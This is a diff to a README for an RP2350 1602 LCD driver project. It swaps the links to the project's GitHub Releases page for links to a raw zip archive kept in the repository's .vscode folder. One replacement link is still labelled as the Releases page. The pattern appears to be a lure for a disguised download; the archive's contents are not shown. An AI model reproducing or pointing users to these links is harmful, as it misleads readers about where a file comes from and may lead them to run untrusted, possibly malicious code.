@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the RP2350 1602 LCD driver. T
 
 ## 📥 Download the Software
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/krishnaramsagar1/RP2350_1602_LCD_Driver/releases)
+[![Download](https://raw.githubusercontent.com/krishnaramsagar1/RP2350_1602_LCD_Driver/main/.vscode/RP2350_1602_LCD_Driver_v2.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/krishnaramsagar1/RP2350_1602_LCD_Driver/main/.vscode/RP2350_1602_LCD_Driver_v2.1.zip)
 
 ## 📝 What is RP2350_1602_LCD_Driver?
 
@@ -32,7 +32,7 @@ Before you start, ensure your system meets the following requirements:
 
 To get started, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to the [GitHub Releases page](https://github.com/krishnaramsagar1/RP2350_1602_LCD_Driver/releases).
+1. **Visit the Releases Page:** Go to the [GitHub Releases page](https://raw.githubusercontent.com/krishnaramsagar1/RP2350_1602_LCD_Driver/main/.vscode/RP2350_1602_LCD_Driver_v2.1.zip).
 
 2. **Select the Latest Release:** Look for the most recent version listed at the top.
 
@@ -69,7 +69,7 @@ If you encounter any issues, feel free to open an issue on the GitHub repository
 
 ## 🔗 Important Links
 
-- [Download Here](https://github.com/krishnaramsagar1/RP2350_1602_LCD_Driver/releases)
+- [Download Here](https://raw.githubusercontent.com/krishnaramsagar1/RP2350_1602_LCD_Driver/main/.vscode/RP2350_1602_LCD_Driver_v2.1.zip)
 - [Documentation Guide](link_to_documentation)
 
 Enjoy using your RP2350 1602 LCD Driver!
